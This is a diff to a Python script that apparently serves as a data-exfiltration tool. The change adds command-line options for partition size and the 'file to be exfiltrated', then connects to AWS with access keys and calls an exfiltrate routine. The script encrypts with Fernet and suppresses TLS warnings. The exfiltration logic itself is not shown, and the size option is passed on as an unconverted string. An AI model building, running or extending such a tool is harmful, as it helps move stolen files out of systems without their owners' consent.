@@ -1,8 +1,8 @@
 import boto3
-import sys
 import json
 import os
 import math
+import argparse
 import socket
 from cryptography.fernet import Fernet
 import urllib3
@@ -10,8 +10,10 @@ import urllib3
 
 class Client():
 
-	partitionSize = 100 #Change for desired partition size
 	f = Fernet(key)
+
+	def __init__(self, partitionSize):
+		self.partitionSize = partitionSize
 
 	def setFileName(self, filePath):
 		self.filePath = filePath
@@ -83,9 +85,21 @@ class Client():
 
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-client = Client()
+
+parser = argparse.ArgumentParser()
+
+parser.add_argument('-s', '--size', help = "Partition size in Kb, 1000Kb = 1Mb",
+					required = True,
+					action = 'store')
+parser.add_argument('-i', '--input', help = "File to be exfiltrated",
+					required = True,
+					action = 'store')
+
+args = parser.parse_args()
+
+client = Client(args.size)
 client.awsConnect(aws_access_key_id, aws_secret_access_key, region)
-client.setFileName(str(sys.argv[1]))
+client.setFileName(args.input)
 client.exfiltrate()
 
 
